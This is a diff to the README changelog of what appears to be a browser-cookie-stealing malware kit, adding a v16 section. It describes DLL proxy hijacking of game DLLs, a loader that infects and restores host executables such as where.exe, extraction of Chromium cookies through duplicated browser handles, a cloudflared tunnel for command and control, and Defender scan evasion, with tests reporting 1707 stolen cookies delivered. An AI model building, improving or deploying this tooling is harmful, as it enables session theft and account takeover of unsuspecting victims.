@@ -1,6 +1,51 @@
 ## What's New
 
-### v15 -- tunnel C2, installers that actually verify (current)
+### v16 -- native DLL proxies, reliable staging and loopback tunnels (current)
+
+**Native x64 DLL proxy staging.** `python build.py proxy native.dll --c2 URL` parses the
+original PE32+ export table, generates forwarders for named, aliased and ordinal-only
+exports, and stages a proxy with the original filename plus the untouched original as
+`native_ck.dll`. `src/proxy.cpp` starts the payload on a worker instead of running browser
+extraction inside `DllMain`; the original DLL remains available through every forwarded
+ordinal. The command verifies the linked export table and writes only to a staging folder,
+never over the installed game DLL. A real x64 fixture loaded the proxy, resolved named and
+ordinal-only imports, returned the expected values, and delivered 1707 cookies through its
+C2 worker. x86, .NET, malformed images and unsupported export
+collisions are rejected instead of producing a broken proxy.
+
+**The tunnel no longer touches the firewall.** Its listener binds only to `127.0.0.1`,
+because cloudflared is the sole local peer. Direct listeners still bind `0.0.0.0` and now
+report a failed inbound rule with the exact elevated `netsh` command. Manually supplied
+remote HTTP and HTTPS endpoints both skip the local listener. GUI port changes preserve
+the URL scheme, path, query and fragment instead of silently converting HTTPS to HTTP.
+
+**Staging fails closed.** `cklog/stage.py` is the single loader patcher used by `auto.py`
+and `pick.py`. A missing/ambiguous sentinel or a C2 URL over 255 UTF-8 bytes aborts output;
+URLs are never truncated. Existing host trailers are stripped only when `CKLG` is exactly
+at EOF and its length is in range. `auto.py` now delegates compiler detection to
+`cklog/toolchain.py` rather than maintaining a second toolchain implementation.
+
+**Native I/O and extraction hardening.** The loader uses complete read/write loops and
+publishes the restored host only after the replacement is fully written; failed restoration
+keeps the backup and aborts the payload. Chromium temporary database names are unique per
+process, WAL/SHM companions are cleaned up, and duplicated browser handles are read with
+explicit `OVERLAPPED` offsets so browser-owned file pointers are not moved. Plain HTTP and
+Schannel status lines handle fragmented receives. Local loot is written completely to a
+temporary file and atomically published, never replacing valid loot with malformed JSON.
+
+**Less repeated work.** The AES provider is cached per process, contiguous unescaped JSON
+bytes are emitted in batches, loader sentinel patching is one pass, and `src/gen.ps1` caches
+its 256 formatted byte literals. The loader's fake Microsoft/Font Cache version metadata
+was replaced with neutral application-launcher metadata.
+
+Bench: 46 unit tests, full clang-cl build and artifact verification pass. A real standalone
+run delivered 1707 cookies and restored `where.exe` byte-for-byte; folder mode through a
+public quick tunnel delivered 1707 cookies with a loopback-only listener and no firewall
+rule. A native test host validated named, aliased and ordinal-only calls through the staged
+proxy. Local Defender scans found no threats in the rebuilt loader, payload, infected test
+EXE or proxy DLL; this is a local static result, not a cloud-reputation guarantee.
+
+### v15 -- tunnel C2, installers that actually verify
 
 **`--tunnel`: a public https C2 with no VPS and no port-forward.** `auto.py` starts
 `cloudflared` in quick-tunnel mode in front of the local listener, waits for the
